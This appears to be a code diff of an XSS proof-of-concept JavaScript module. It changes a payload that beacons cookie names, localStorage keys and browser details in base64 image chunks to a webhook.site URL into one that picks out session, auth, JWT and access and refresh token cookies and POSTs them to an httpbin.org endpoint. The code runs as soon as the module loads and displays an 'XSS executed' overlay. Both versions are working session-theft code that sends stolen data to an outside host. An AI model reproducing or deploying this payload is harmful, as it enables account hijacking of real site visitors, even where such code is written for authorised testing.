@@ -1,16 +1,21 @@
 define([], function () {
-  var WEBHOOK_URL = "https://webhook.site/fb9555c7-cb50-4b63-bc1b-1d9befffd87b";
-  var COOKIE_ALLOWLIST = [
-    "_ga",
-    "_gid",
-    "_gat",
-    "OptanonConsent",
-    "OptanonAlertBoxClosed",
-    "cookieconsent_status",
-    "cookie_consent",
-    "ak_bmsc",
-    "bm_sv",
-    "AMCV"
+  var HTTPBIN_BASE = "https://httpbin.org/anything/cp-hash-loader";
+  var AUTH_COOKIE_HINTS = [
+    "sess",
+    "session",
+    "auth",
+    "token",
+    "jwt",
+    "sid",
+    "sso",
+    "identity",
+    "account",
+    "login",
+    "logged",
+    "remember",
+    "id_token",
+    "access_token",
+    "refresh_token"
   ];
 
   function nowIso() {
@@ -45,39 +50,25 @@ define([], function () {
           value: t.slice(eq + 1)
         };
       })
-      .filter(function (c) { return c.name; });
+      .filter(function (cookie) {
+        return cookie.name;
+      });
   }
 
-  function pickLowRiskCookie(parsedCookies) {
-    var i;
-    for (i = 0; i < COOKIE_ALLOWLIST.length; i++) {
-      var wanted = COOKIE_ALLOWLIST[i].toLowerCase();
-      for (var j = 0; j < parsedCookies.length; j++) {
-        if ((parsedCookies[j].name || "").toLowerCase().indexOf(wanted) !== -1) {
-          return parsedCookies[j];
-        }
+  function isAuthCookieName(name) {
+    var low = (name || "").toLowerCase();
+    for (var i = 0; i < AUTH_COOKIE_HINTS.length; i++) {
+      if (low.indexOf(AUTH_COOKIE_HINTS[i]) !== -1) {
+        return true;
       }
     }
-    return parsedCookies.length ? parsedCookies[0] : null;
+    return false;
   }
 
-  function collectNavigatorLite() {
-    var n = window.navigator || {};
-    return {
-      userAgent: n.userAgent,
-      language: n.language,
-      languages: safeCall(function () { return (n.languages || []).slice(0, 5); }, []),
-      platform: n.platform,
-      cookieEnabled: n.cookieEnabled
-    };
-  }
-
-  function encodeBase64Utf8(str) {
-    try {
-      return btoa(unescape(encodeURIComponent(str)));
-    } catch (e) {
-      return "";
-    }
+  function collectAuthCookies(cookies) {
+    return cookies.filter(function (cookie) {
+      return isAuthCookieName(cookie.name);
+    });
   }
 
   function makeSessionId() {
@@ -85,72 +76,123 @@ define([], function () {
     return "cp" + Date.now().toString(36) + rnd;
   }
 
-  function sendPayload(payload) {
-    var serialized = safeCall(function () { return JSON.stringify(payload); }, "{}");
-    var base64Payload = encodeBase64Utf8(serialized);
-    var chunkSize = 1400;
-    var total = Math.ceil(base64Payload.length / chunkSize);
-    var session = makeSessionId();
-    var sent = 0;
-    var lastUrl = null;
+  function writeToHttpbin(url, payload) {
+    var body = safeCall(function () {
+      return JSON.stringify(payload);
+    }, "{}");
 
-    for (var i = 0; i < total; i++) {
-      var chunk = base64Payload.slice(i * chunkSize, (i + 1) * chunkSize);
-      var img = new Image();
-      img.referrerPolicy = "no-referrer";
-      img.src = WEBHOOK_URL +
-        "?event=cp_loader_chunk" +
-        "&sid=" + encodeURIComponent(session) +
-        "&idx=" + i +
-        "&total=" + total +
-        "&ts=" + encodeURIComponent(nowIso()) +
-        "&d=" + encodeURIComponent(chunk);
-      sent += 1;
-      lastUrl = img.src;
-    }
-
-    window.__CP_POC_DELIVERY__ = {
-      mode: "image_chunks",
-      session: session,
-      totalChunks: total,
-      sentChunks: sent
-    };
-    window.__CP_POC_CHUNK_COUNT__ = total;
-    window.__CP_POC_LAST_IMG_URL__ = lastUrl;
+    return fetch(url, {
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+      cache: "no-store",
+      keepalive: true,
+      headers: {
+        "Content-Type": "text/plain;charset=UTF-8"
+      },
+      body: body
+    })
+      .then(function (response) {
+        return response.text().then(function (text) {
+          var parsed = safeCall(function () {
+            return JSON.parse(text);
+          }, null);
+          return {
+            ok: response.ok,
+            status: response.status,
+            requestUrl: url,
+            echoedUrl: parsed && parsed.url ? parsed.url : url
+          };
+        });
+      });
   }
 
-  function markVisualProof(ts) {
-    var id = "cp-xss-proof-badge";
-    if (document.getElementById(id)) {
-      return;
+  function upsertSpeechBalloon(title, link, statusText, isError) {
+    var balloonId = "cp-httpbin-balloon";
+    var titleId = "cp-httpbin-balloon-title";
+    var linkId = "cp-httpbin-balloon-link";
+    var statusId = "cp-httpbin-balloon-status";
+    var balloon = document.getElementById(balloonId);
+
+    if (!balloon) {
+      balloon = document.createElement("div");
+      balloon.id = balloonId;
+      balloon.style.position = "fixed";
+      balloon.style.right = "22px";
+      balloon.style.bottom = "24px";
+      balloon.style.maxWidth = "420px";
+      balloon.style.padding = "12px 14px";
+      balloon.style.background = "#0b1022";
+      balloon.style.color = "#e6ecff";
+      balloon.style.border = "1px solid #5aa0ff";
+      balloon.style.borderRadius = "12px";
+      balloon.style.boxShadow = "0 10px 28px rgba(0, 0, 0, 0.45)";
+      balloon.style.font = "12px/1.45 monospace";
+      balloon.style.zIndex = "2147483647";
+
+      var tail = document.createElement("div");
+      tail.style.position = "absolute";
+      tail.style.right = "30px";
+      tail.style.bottom = "-8px";
+      tail.style.width = "16px";
+      tail.style.height = "16px";
+      tail.style.background = "#0b1022";
+      tail.style.borderRight = "1px solid #5aa0ff";
+      tail.style.borderBottom = "1px solid #5aa0ff";
+      tail.style.transform = "rotate(45deg)";
+      tail.style.zIndex = "-1";
+      balloon.appendChild(tail);
+
+      var titleEl = document.createElement("div");
+      titleEl.id = titleId;
+      titleEl.style.fontWeight = "700";
+      titleEl.style.marginBottom = "5px";
+      balloon.appendChild(titleEl);
+
+      var linkEl = document.createElement("a");
+      linkEl.id = linkId;
+      linkEl.target = "_blank";
+      linkEl.rel = "noreferrer noopener";
+      linkEl.style.display = "block";
+      linkEl.style.marginBottom = "6px";
+      linkEl.style.wordBreak = "break-all";
+      linkEl.style.color = "#9fd0ff";
+      linkEl.style.textDecoration = "underline";
+      balloon.appendChild(linkEl);
+
+      var statusEl = document.createElement("div");
+      statusEl.id = statusId;
+      balloon.appendChild(statusEl);
+
+      document.documentElement.appendChild(balloon);
     }
-    var badge = document.createElement("div");
-    badge.id = id;
-    badge.textContent = "XSS executed at " + ts + " on " + window.location.origin;
-    badge.style.position = "fixed";
-    badge.style.right = "16px";
-    badge.style.bottom = "16px";
-    badge.style.padding = "10px 14px";
-    badge.style.background = "#111";
-    badge.style.color = "#00ff90";
-    badge.style.font = "12px monospace";
-    badge.style.zIndex = "2147483647";
-    badge.style.border = "1px solid #00ff90";
-    badge.style.borderRadius = "6px";
-    document.documentElement.appendChild(badge);
+
+    var titleNode = document.getElementById(titleId);
+    var linkNode = document.getElementById(linkId);
+    var statusNode = document.getElementById(statusId);
+
+    if (titleNode) {
+      titleNode.textContent = title || "PoC";
+    }
+    if (linkNode) {
+      linkNode.href = link || "#";
+      linkNode.textContent = link || "no link";
+    }
+    if (statusNode) {
+      statusNode.textContent = statusText || "";
+      statusNode.style.color = isError ? "#ffafaf" : "#7cffb4";
+    }
+    if (balloon) {
+      balloon.style.borderColor = isError ? "#ff8080" : "#5aa0ff";
+    }
   }
 
   function executePoC() {
     var ts = nowIso();
     var cookies = parseCookies();
-    var chosen = pickLowRiskCookie(cookies);
-    var localStorageKeys = safeCall(function () {
-      var keys = [];
-      for (var i = 0; i < localStorage.length && i < 30; i++) {
-        keys.push(localStorage.key(i));
-      }
-      return keys;
-    }, []);
+    var authCookies = collectAuthCookies(cookies);
+    var session = makeSessionId();
+    var requestUrl = HTTPBIN_BASE + "/" + session;
 
     var marker = {
       executed: true,
@@ -158,39 +200,67 @@ define([], function () {
       origin: window.location.origin,
       href: window.location.href
     };
+
     window.__CP_POC_MARKER__ = marker;
     safeCall(function () {
       localStorage.setItem("cp_poc_marker", JSON.stringify(marker));
     }, null);
 
     var payload = {
-      event: "cp_hash_loader_xss_exec_proof",
+      event: "cp_hash_loader_auth_cookie_httpbin",
       marker: {
         executed: true,
         ts: ts,
         victimOrigin: window.location.origin,
-        victimHref: window.location.href,
-        documentDomain: document.domain
+        victimHref: window.location.href
       },
-      selectedCookieProof: chosen,
-      cookieNames: cookies.map(function (c) { return c.name; }).slice(0, 30),
-      cookieCount: cookies.length,
-      localStorageKeyCount: safeCall(function () { return localStorage.length; }, 0),
-      localStorageKeys: localStorageKeys,
-      navigator: collectNavigatorLite(),
-      referrer: document.referrer || "",
-      title: document.title || ""
+      authCookies: authCookies,
+      authCookieCount: authCookies.length,
+      note: "Only non-HttpOnly cookies readable from current site are included."
     };
 
-    markVisualProof(ts);
-    sendPayload(payload);
+    window.__CP_POC_HTTPBIN_URL__ = requestUrl;
+    window.__CP_POC_AUTH_COOKIES__ = authCookies;
+
+    upsertSpeechBalloon(
+      "XSS executed at " + ts,
+      requestUrl,
+      "Posting auth cookies to httpbin...",
+      false
+    );
+
+    writeToHttpbin(requestUrl, payload)
+      .then(function (delivery) {
+        window.__CP_POC_DELIVERY__ = delivery;
+        upsertSpeechBalloon(
+          "HTTPBIN saved",
+          delivery.echoedUrl || requestUrl,
+          "Status: " + delivery.status,
+          !delivery.ok
+        );
+      })
+      .catch(function (err) {
+        window.__CP_POC_DELIVERY__ = {
+          ok: false,
+          status: 0,
+          requestUrl: requestUrl,
+          error: String(err && err.message ? err.message : err)
+        };
+        upsertSpeechBalloon(
+          "HTTPBIN write failed",
+          requestUrl,
+          "Error: " + window.__CP_POC_DELIVERY__.error,
+          true
+        );
+      });
+
     return marker;
   }
 
   executePoC();
 
   return {
-    version: "103.0.0-image-chunks",
+    version: "104.0.0-httpbin-auth-cookie-balloon",
     render: function () {
       return executePoC();
     }
